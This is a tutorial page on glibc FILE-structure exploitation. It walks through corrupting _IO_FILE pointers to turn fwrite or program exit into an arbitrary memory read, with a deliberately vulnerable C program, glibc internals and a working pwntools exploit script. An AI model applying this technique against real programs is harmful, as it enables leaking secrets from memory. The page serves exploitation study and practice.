#metadata(
  (
    title: "Arbitrary Read",
    description: "Corrupting the _IO_FILE structure to leak data from arbitrary memory addresses.",
    date: "2026-01-02",
    order: 3,
    draft: false,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project

== Prerequisites
- *Memory Corruption*: Ability to overwrite a `FILE` structure (either a custom one or standard streams like `stdout`/`stderr`).
- *Known Address*: Knowledge of the address of the data you want to leak (e.g., a flag or a stack/libc pointer).
- *Output Stream*: A trigger to flush the stream. This can be an explicit call (like `fwrite`) or an implicit one (like `exit`).

= Arbitrary Read via FILE Structure Corruption

The `FILE` structure's buffer pointers determine where data is read from and written to during I/O operations. By corrupting these pointers, an attacker can transform a standard library call like `fwrite` into a powerful arbitrary memory leak primitive.

This technique is not limited to explicitly opened files; it is often used against `stdout` to leak data even when no explicit output function is called.

== Vulnerable Scenario

Consider a program that allows an overflow into a `FILE` structure or a pointer to one. In the example below, a `read` call directly overwrites the `fp` object's memory.

```c
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char secret[0x100];
FILE *fp;
char *buf;

int main() {
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stdout, NULL, _IONBF, 0);
  strcpy(secret, "well done baby");
  printf("The secret is located at %p\n", secret);

  buf = malloc(0x100);
  fp = fopen("/tmp/uiiaiiuuiiai.txt", "w");

  // The vulnerability: 0x1e0 bytes overflow into the FILE structure
  read(0, fp, 0x1e0);

  // This call will now use our corrupted structure
  fwrite(buf, 1, 0x100, fp);
  return 0;
}
```

== Glibc Internals: `_IO_new_file_overflow`

When `fwrite` is called (or any function that triggers a flush), it eventually invokes `_IO_new_file_overflow`. To reach the arbitrary write primitive (`_IO_do_write`), we must satisfy several internal checks.

```c
// Simplified glibc/libio/fileops.c
int _IO_new_file_overflow (FILE *f, int ch)
{
  // [1] Check permissions to skip this
  if (f->_flags & _IO_NO_WRITES)
    return EOF;

  // [2] Ensure we are in 'putting' mode and have a valid base to skip this
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0 || f->_IO_write_base == NULL)
  {
    /* ... (code that might reset pointers) ... */
  }

  // [3] Goal: Trigger _IO_do_write with controlled pointers
  if (ch == EOF)
    return _IO_do_write (f, f->_IO_write_base,
			 f->_IO_write_ptr - f->_IO_write_base);
}
```

Further down, `_IO_do_write` (or `new_do_write`) performs another critical check:

```c
static size_t new_do_write (FILE *fp, const char *data, size_t to_do)
{
  // [4] Avoid appending mode logic
  if (fp->_flags & _IO_IS_APPENDING) { /* ... */ }

  // [5] Crucial constraint: bypass buffer adjustment
  else if (fp->_IO_read_end != fp->_IO_write_base) { /* ... */ }

  // [6] The Primitive: System call write(fp->_fileno, data, to_do)
  return _IO_SYSWRITE (fp, data, to_do);
}
```

== Exploitation Strategy

To leak the `secret` string, we must craft the `FILE` structure to meet these conditions:

1. *`_flags`*:
  - Clear `_IO_NO_WRITES` (`0x0008`).
  - Set `_IO_CURRENTLY_PUTTING` (`0x0800`).
  - A common safe value is `0xfbad0000 | 0x800` (incorporating `_IO_MAGIC`).
2. *`_IO_write_base`*: Points to the start of the memory we want to read (`secret`).
3. *`_IO_write_ptr`*: Points to the end of the memory we want to read (`secret + length`).
4. *`_IO_read_end`*: Must be exactly equal to `_IO_write_base` to satisfy the check in `new_do_write`.
5. *`_fileno`*: Set to `1` (stdout) or another descriptor we can monitor.

=== Explicit vs. Implicit Triggers

Crucially, this can work *even without* an explicit call to `fwrite`. When a C program terminates normally (e.g., via `return 0;` or `exit()`), it iterates through *all* active file streams (including `stdout`, `stderr`, and opened files) via `_IO_list_all` and flushes their buffers.

The flush (and thus the leak) occurs whenever Glibc decides it needs to write the buffer's contents. This happens when:

1. *Explicit Functions*: Functions that take a `FILE *` pointer (e.g., `fwrite(buf, 1, 1, fp)`, `fprintf(fp, ...)`).
2. *Implicit Functions*: Functions that default to `stdout` (e.g., `puts`, `printf`, `putchar`).
3. *Program Termination*: `exit()` or returning from `main` (iterates `_IO_list_all` and flushes).
4. *Explicit Flush*: `fflush(stdout)` or `fflush(NULL)`.
5. *Tied Streams*: Input functions on `stdin` (like `scanf` or `gets`) will flush `stdout` if the streams are tied (common in interactive apps).
6. *Line Buffering*: Printing a `\n` if the `_IO_LINE_BUF` flag (`0x200`) is set.
7. *Abort*: `abort()` often calls `_IO_flush_all_lockp` during cleanup.

== Exploit Script

```python
from pwn import *

p = process("./challenge")

p.recvuntil(b"located at ")
secret_addr = int(p.recvline().strip(), 16)
info(f"Secret address: {hex(secret_addr)}")

# Crafting the fake FILE structure
payload = flat({
    0x00: p64(0xfbad0000 | 0x800), # _flags: MAGIC + CURRENTLY_PUTTING
    0x10: p64(secret_addr),        # _IO_read_end (must == _IO_write_base)
    0x20: p64(secret_addr),        # _IO_write_base (start of leak)
    0x28: p64(secret_addr + 0x100),# _IO_write_ptr (end of leak)
    0x70: p32(1),                  # _fileno (stdout)
}, filler=b"\x00")

p.send(payload)
print(p.recvall(timeout=2))
```

